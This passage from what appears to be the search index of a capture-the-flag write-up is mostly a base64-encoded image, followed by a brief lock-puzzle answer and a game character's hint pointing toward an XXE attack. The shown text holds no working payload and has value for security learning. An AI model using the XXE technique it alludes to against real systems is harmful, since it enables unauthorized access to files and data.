pZjpQaXhlbFhEaW1lbnNpb\n24+CiAgICAgICAgIDxleGlmOlBpeGVsWURpbWVuc2lvbj4zMzU8L2V4aWY6UGl4ZWxZRGltZW5zaW9uPgogICAgICAgIC\nA8dGlmZjpJbWFnZVdpZHRoPjY1NzwvdGlmZjpJbWFnZVdpZHRoPgogICAgICAgICA8dGlmZjpSZXNvbHV0aW9uVW5pdD4\nyPC90aWZmOlJlc29sdXRpb25Vbml0PgogICAgICAgICA8dGlmZjpJbWFnZUxlbmd0aD4zMzU8L3RpZmY6SW1hZ2VMZW5n\ndGg+CiAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgICAgIDx0aWZmOlhSZ\nXNvbHV0aW9uPjcyPC90aWZmOlhSZXNvbHV0aW9uPgogICAgICAgICA8dGlmZjpZUmVzb2x1dGlvbj43MjwvdGlmZjpZUm\nVzb2x1dGlvbj4KICAgICAgICAgPHhtcE1NOkhpc3Rvcnk+CiAgICAgICAgICAgIDxyZGY6U2VxPgogICAgICAgICAgICA\ngICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OnNvZnR3YXJl\nQWdlbnQ+QWZmaW5pdHkgRGVzaWduZXIgMiAyLjAuMDwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgI\nCAgPHN0RXZ0OmFjdGlvbj5wcm9kdWNlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6d2hlbj\n4yMDIyLTEyLTA4VDIyOjIxOjE0KzAxOjAwPC9zdEV2dDp3aGVuPgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICA\ngICAgICAgPC9yZGY6U2VxPgogICAgICAgICA8L3htcE1NOkhpc3Rvcnk+CiAgICAgICAgIDx4bXA6TW9kaWZ5RGF0ZT4y\nMDIyLTEyLTA4VDIyOjIxOjE0KzAxOjAwPC94bXA6TW9kaWZ5RGF0ZT4KICAgICAgICAgPHhtcDpNZXRhZGF0YURhdGU+M\njAyMi0xMi0wOFQyMjoyMToxNCswMTowMDwveG1wOk1ldGFkYXRhRGF0ZT4KICAgICAgICAgPHBob3Rvc2hvcDpJQ0NQcm\n9maWxlPkRpc3BsYXk8L3Bob3Rvc2hvcDpJQ0NQcm9maWxlPgogICAgICAgICA8cGhvdG9zaG9wOkNvbG9yTW9kZT4zPC9\nwaG90b3Nob3A6Q29sb3JNb2RlPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0\nYT4KB1H9dwAACQhJREFUeAHtnXmoFVUcx7/Pl5VtGpZtGJa2U2gZtEOlBtpGCxEVWFD9U9G+YREl7UVU/1RQgUZIC2kpZ\nFagWUFWUrRYWpK0WZZlq6av+Y1cfe963++8671z78ycz9Tj3Te/OzPnfH7n45mZe+6cDnUl/7FAAAI1CfSruZaVEIBASg\nBBaAgQcAggiAOHEAQQhDYAAYcAgjhwCEEAQWgDEHAIIIgDhxAEEIQ2AAGHAII4cAhBAEFoAxBwCCCIA4cQBBCENgABhwC\nCOHAIQQBBaAMQcAggiAOHEAQQhDYAAYcAgjhwCEEAQWgDEHAIIIgDhxAEEIQ2AAGHAII4cAhBAEFoAxBwCCCIA4cQBBCE\nNgABhwCCOHAIQQBBaAMQcAggiAOHEAQQhDYAAYcAgjhwCEEAQWgDEHAIIIgDhxAEEIQ2AAGHAII4cAhBAEFoAxBwCCCIA\n4cQBBCENgABhwCCOHAIQQBBaAMQcAggiAOHEAQQhDYAAYcAgjhwCEEAQWgDEHAIIIgDhxAEEIQ2AAGHAII4cAhBAEFoAx\nBwCCCIA4cQBBCENgABhwCCOHAIQQBBaAMQcAggiAOHEAQQhDYAAYcAgjhwCEEAQWgDEHAIIIgDhxAEEIQ2AAGHAII4cAh\nBoGPmeHWtSzSp/Kzt3Pja1rX673YcM1THvpSJplROAh1dUvI/S6MEKv/AVH6HpGs03hdpGz1GvduXoUzV7QBBqonwd9QE\nujp6njUhSNTNgcqHCHCRHiJEPGoCCBJ1+ql8iACChAgRj5oAgkSdfiofIoAgIULEoyaAIFGnn8qHCCBIiBDxqAkgSNTpp\n/IhAggSIkQ8agIIEnX6qXyIAIKECBGPmgCCRJ1+Kh8igCAhQsSjJoAgUaefyocIIEiIEPGoCSBI1Omn8iECCBIiRDxqAg\ngSdfqpfIgAgoQIEY+aAIJEnX4qHyKAICFCxKMmgCBRp5/KhwggSIgQ8agJIEjU6afyIQIIEiJEPGoCCBJ1+ql8iACChAg\n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\"&gt;\n</code></pre>   <p>Fun fact, while a little tedious, this final solution can actually be applied to all the locks! </p>  <p>Answer</p> <p>Find the correct keys to open all the locks.</p>"},{"location":"objectives/o9/#response","title":"Response","text":"<p>Hal Tandybuck</p> <p>Great! Thanks so much for your help! When you get to the fountain inside, there are some things you should consider. First, it might be helpful to focus on Glamtariel's CAPITALIZED words. If you finish those locks, I might just have another hint for you! ... Wha - what?? You opened all the locks?! Well then... Did you see the nearby terminal with evidence of an XXE attack? Maybe take a close look at that kind of thing.</p>"}]}